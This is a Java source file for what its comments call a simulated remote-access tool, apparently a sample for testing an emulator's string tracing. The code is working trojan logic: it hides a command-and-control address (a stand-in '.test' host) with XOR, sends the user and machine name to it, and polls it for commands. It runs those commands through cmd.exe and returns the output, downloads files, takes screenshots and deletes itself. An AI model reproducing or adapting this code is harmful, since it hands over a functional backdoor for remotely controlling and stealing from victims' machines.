package dev.javabyte.guest.sim;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;

/**
 * Simulated remote-access tool that polls an HTTP server for commands.
 * The server address is stored XOR-encrypted, as real samples hide theirs.
 */
public final class HttpRat {

    private static final byte[] ENCRYPTED_SERVER = encrypt("http://c2.rat.test:8080");

    private static byte[] encrypt(String text) {
        byte[] bytes = text.getBytes(StandardCharsets.UTF_8);
        for (int i = 0; i < bytes.length; i++) {
            bytes[i] ^= (byte) (0x5A + i);
        }
        return bytes;
    }

    /** Static and String-returning: the emulator's string tracing should reveal the address. */
    static String server() {
        byte[] bytes = ENCRYPTED_SERVER.clone();
        for (int i = 0; i < bytes.length; i++) {
            bytes[i] ^= (byte) (0x5A + i);
        }
        return new String(bytes, StandardCharsets.UTF_8);
    }

    public static void main(String[] args) throws Exception {
        String machine = System.getProperty("user.name") + "@" + System.getenv("COMPUTERNAME");
        byte[] digest = MessageDigest.getInstance("MD5").digest(machine.getBytes(StandardCharsets.UTF_8));
        StringBuilder id = new StringBuilder();
        for (int i = 0; i < 4; i++) {
            id.append(String.format("%02x", digest[i]));
        }
        post("/register", "id=" + id + "&os=" + System.getProperty("os.name") + "&user=" + machine);

        for (int n = 1; ; n++) {
            String command = get("/task?id=" + id + "&n=" + n);
            if (command == null || command.isBlank()) {
                Thread.sleep(30_000);
                continue;
            }
            String[] parts = command.trim().split(" ", 3);
            switch (parts[0]) {
                case "exec": {
                    Process process = Runtime.getRuntime().exec("cmd.exe /c " + command.substring(5));
                    String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
                    post("/result?n=" + n, output);
                    break;
                }
                case "download": {
                    try (InputStream in = new URL(parts[1]).openStream(); FileOutputStream out = new FileOutputStream(parts[2])) {
                        out.write(in.readAllBytes());
                    }
                    post("/result?n=" + n, "saved " + new File(parts[2]).length());
                    break;
                }
                case "screenshot":
                    try {
                        java.awt.image.BufferedImage image = new java.awt.Robot()
                                .createScreenCapture(new java.awt.Rectangle(0, 0, 800, 600));
                        post("/result?n=" + n, "captured " + image.getWidth());
                    } catch (Throwable unavailable) {
                        post("/result?n=" + n, "screenshot failed");
                    }
                    break;
                case "uninstall":
                    new File(HttpRat.class.getProtectionDomain().getCodeSource().getLocation().toURI()).delete();
                    System.out.println("uninstalled");
                    System.exit(0);
                    break;
                default:
                    post("/result?n=" + n, "unknown command");
            }
        }
    }

    private static String get(String path) throws Exception {
        HttpURLConnection connection = (HttpURLConnection) new URL(server() + path).openConnection();
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (rat)");
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
            return reader.readLine();
        }
    }

    private static void post(String path, String body) throws Exception {
        HttpURLConnection connection = (HttpURLConnection) new URL(server() + path).openConnection();
        connection.setRequestMethod("POST");
        connection.setDoOutput(true);
        connection.getOutputStream().write(body.getBytes(StandardCharsets.UTF_8));
        connection.getResponseCode();
    }
}
